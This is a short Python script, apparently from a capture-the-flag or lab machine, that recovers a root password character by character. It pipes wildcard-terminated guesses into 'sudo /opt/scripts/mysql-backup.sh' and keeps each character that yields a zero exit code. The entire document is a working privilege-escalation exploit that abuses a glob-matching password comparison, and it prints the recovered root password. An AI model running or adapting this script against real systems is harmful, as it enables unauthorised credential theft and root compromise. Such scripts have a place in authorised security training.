import string
import os

chars = string.ascii_letters + string.digits
password=''
next=1

print("[+] Starting script...")
print("[+] bruteforce in progress...")
while next==1:
        for i in chars:
                errorlevel=os.system("echo "+password+i+"* | sudo /opt/scripts/mysql-backup.sh >/dev/null 2>&1")
                if errorlevel==0:
                        password=password+i
                        print("[+] new character found: "+password)
                        next=1
                        break
                else: next=0
print("[+] process terminated, root password is: "+password)
